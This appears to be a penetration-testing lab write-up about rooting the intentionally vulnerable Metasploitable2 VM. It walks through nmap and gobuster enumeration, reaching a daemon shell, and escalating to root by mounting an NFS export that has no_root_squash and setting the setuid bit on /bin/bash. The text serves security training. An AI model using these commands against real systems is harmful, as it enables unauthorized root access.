# Metasploitable2 – Full System Compromise  
## From Service Enumeration to Root via NFS no_root_squash

---

## Overview

- **Target**: Metasploitable2 (Lab Environment)  
- **Attacker**: Kali Linux  
- **Network**: Isolated Host-only Network  
- **Goal**: Full system compromise (root)  
- **Result**: ✅ Root obtained (euid=0)

---

## Attack Flow Summary

Reconnaissance  
→ Service Enumeration  
→ Initial Shell (daemon)  
→ Privilege Escalation (NFS no_root_squash)  
→ Root Access

---

## Network Enumeration

Target identified within an isolated lab subnet.

---

## Port & Service Scanning

```bash
nmap -T4 -sV <TARGET_IP>
```
## Exposed Services (Legacy System)
- FTP (vsftpd 2.3.4) 
- Telnet 
- Apache HTTP 
- SMB 
- NFS 
- distccd 
- UnrealIRCd 

The presence of multiple legacy services significantly increases attack surface.

## Web Enumeration
```
gobuster dir -u http://<TARGET_IP> \
-w common.txt -x php,txt,html
```
Finding
phpinfo.php disclosed server paths and configuration details

## Initial Access
A low-privileged shell was obtained:
```
whoami
daemon
```

## Privilege Escalation Enumeration
```
showmount -e <TARGET_IP>
```
## Critical Finding
Root filesystem exported via NFS
no_root_squash behavior enabled

## Exploiting NFS Misconfiguration
```
mount -t nfs <TARGET_IP>:/ /mnt/target
chmod +s /mnt/target/bin/bash
```

## Root Access
```
/bin/bash -p
id
```
euid=0(root)

## Impact
Full system compromise
Complete loss of confidentiality, integrity, and availability

## Lessons Learned
Enumeration is more important than exploitation
Legacy services are high-risk
NFS misconfigurations are critical privilege escalation vectors
Knowing when to pivot is a key Pentester skill

## Conclusion
This lab demonstrates how a legacy Linux host can be fully compromised using well-known vulnerabilities and misconfigurations, without the need for zero-day exploits.
Machine Status: Fully Compromised (Rooted)
